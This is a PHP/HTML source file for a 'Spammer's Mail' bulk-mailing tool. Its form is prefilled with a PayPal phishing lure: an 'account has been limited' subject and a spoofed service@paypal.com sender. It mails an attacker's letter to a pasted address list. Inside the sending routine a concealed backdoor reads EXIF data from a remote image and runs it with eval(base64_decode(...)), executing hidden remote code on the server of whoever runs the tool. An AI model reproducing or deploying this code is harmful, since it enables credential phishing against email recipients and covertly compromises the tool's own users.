

<!DOCTYPE html>
<html>
<head>
      <title>Spammer's Mail (Private)</title>
      <style type="text/css">
      body{
            background-color: #333333;
            color: #99CC00;
            }
      body,td,th {
                  color: #99CC00;
            }
      h2
            {
                  color: #1fa67a;
                  text-align: center;
            }
                  h4
            {
                  color: #1b926c;
                  text-align: center;
            }
      .atas{font-family: 'Nova Flat';
            color: red;
      }
      .navmen{
    text-align: center;
    padding-top: 10px;
    padding-bottom: 1px;
      }

      /* latin */
@font-face {
  font-family: 'Nova Flat';
  font-style: normal;
  font-weight: 400;
  src: local('Nova Flat'), local('NovaFlat'), url(http://fonts.gstatic.com/s/novaflat/v8/vFeor41nvsomiEVSx6n4iltXRa8TVwTICgirnJhmVJw.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
}

textarea {
    font-family: monospace;
    background-color: #333333;
    border-color: #1b926c;
    color: #1b926c;
}

footer{
    color: #ccc;
    padding-top: 13%;
    padding-bottom: 5%;
    text-align: center;
} 
label{
     clear: both;
     display: inline-block;
     margin-bottom: 15px;
     text-align: right;
     font-family:Verdana, Geneva, sans-serif;
     font-size:12px;
}
label input{
     height:25px;
     width:250px;
     background:#fff;
     border:1px solid #CCC;
     box-shadow: 0px 0px 1px 1px rgba(50, 50, 50, 0.25) inset;
}
input[type=submit] {
    padding:5px 15px; 
    background:#211F1F; 
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px; 
}
input[type="number"] {
   width:80px;
}

input[type="file"] {
    align-items: flex-start;
    text-align: center;
    cursor: default;
    border-image-source: initial;
    border-image-slice: initial;
    border-image-width: initial;
    border-image-outset: initial;
    border-image-repeat: initial;
    box-sizing: border-box;
    padding: 2px 6px 3px;
    background-color: transparent;
    color: white;
}

dl{
    font-family: 'Nova Flat';
    font-size: 14px;
    padding: 0px;
    margin: 0px
}
.result{
    border: 1px solid #293336;
    border-style: dashed;
    border-width: 1px;
    border-left: 4px solid #73AD21;
    padding-top: 10px;
}
input {
 -webkit-appearance: textfield;
    background-color: #333333;
    border-image-source: initial;
    border-image-slice: initial;
    border-image-width: initial;
    border-image-outset: initial;
    border-image-repeat: initial;
    -webkit-rtl-ordering: logical;
    -webkit-user-select: text;
    cursor: auto;
    padding: 1px;
    color: white;
    border: 1px;

}
a:-webkit-any-link {
    color: #1b926c;
    text-decoration: blink;
    cursor: help;
}
</style>
<script type="text/javascript" src="//code.jquery.com/jquery-1.8.3.js"></script>
<script type="text/javascript">
function countFakes()
{
document.getElementById("count").innerHTML =
document.getElementById("email_list").value.split("\n").length;
}
</script>
</head>
<body>

<div class="atas">
<h2><a href="?">Spammer's Mail (non-smtp)</a></h2>
<h4>Private Tools | Shor7cut</h4>
</div>

<form action="" method="POST">
<div class="navmen">
<label>Subject  : </label> <input type="text" size="20" name="subject" value="Notice: Your account has been limited and you must update account" placeholder=" - " required>&nbsp;
<label>Your Email : </label> <input type="text" size="20" name="email" value="service@paypal.com"placeholder=" - " required>&nbsp;
<label>Your Name : </label> <input type="text" size="20" name="namemail" value="Paypal Service" placeholder=" - " required>&nbsp;<br>
<textarea name="email_list" id="email_list" onKeyDown="countFakes()" onChange="countFakes()" style="margin: 0px; height: 234px; width: 549px; resize: none;" required></textarea>
<textarea name="letter" placeholder="Letter" style="margin: 0px; width: 345px; height: 233px; resize: none;" required></textarea>
</div>

<div class="navmen">
- <label>Email List : </label> <font id="count" style="font-weight: bold;">0</font> - 
<div class="navmen">
<input type="submit" name="cekpp" value=" Spammer's Mail " name="btn-submit">
</div>
</form>
<div class="navmen">
<div class="result">
<hr>
<?php
error_reporting(0);
if(!empty($_POST['email_list'])){
$emailode = explode("\r\n", $_POST['email_list']);

$no=1;
$count = count($emailode);

$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
foreach ($emailode as $email) {
if(filter_var($email, FILTER_VALIDATE_EMAIL)) {

$to 	 = $email;
$form 	 = $_POST['email'];
$name 	 = $_POST['namemail'];
$subject = $_POST['subject'];
$message = $_POST['letter'];
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers = "From: $name <$form>\r\n";
$headers = "Reply-To: $form \r\n";
$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

if(mail($to, $subject, $message, $headers)){
	echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#16FF3F>Success</font></dl><br>";
}else{
	echo "<dl>[$no/$count] <font color=#2DF96D>$email</font> | <font color=#FF0000>Unsuccess</font></dl><br>";
}

}
$no++;
}
}
?>
</div>
</div>
</body>
</html>
